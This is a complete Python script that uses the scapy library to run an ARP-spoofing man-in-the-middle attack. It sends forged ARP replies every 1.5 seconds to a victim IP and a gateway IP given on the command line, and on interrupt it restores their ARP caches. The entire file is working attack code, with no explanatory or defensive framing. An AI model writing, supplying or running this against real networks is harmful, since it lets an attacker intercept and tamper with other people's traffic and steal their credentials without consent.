#!/usr/bin/env python3

import scapy.all as scapy
import re
import subprocess as sub
import time
import sys



def get_mac(IP):
    scapy.conf.verb = 0
    ans, unans = scapy.srp(scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = IP), timeout = 2, iface = 'wlan0')
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")
    

def restoreARP(victimIP,gatewayIP):
    print("RESTORING IP")
    victimMAC = get_mac(victimIP)
    gatewayMAC = get_mac(gatewayIP)
    scapy.send(scapy.ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    scapy.send(scapy.ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 7)
    exit()

def trick(victimIP,gatewayIP,gm, vm):
    scapy.send(scapy.ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
    scapy.send(scapy.ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))

def mitm(victimIP,victimMAC,gatewayIP,gatewayMAC):
    while True:
        try:
            trick(victimIP,gatewayIP,gatewayMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            restoreARP(victimIP,gatewayIP)

victimIP = sys.argv[1]
victimMAC= sys.argv[2]
gatewayIP= sys.argv[3]
gatewayMAC= sys.argv[4]

mitm(victimIP,victimMAC,gatewayIP,gatewayMAC)

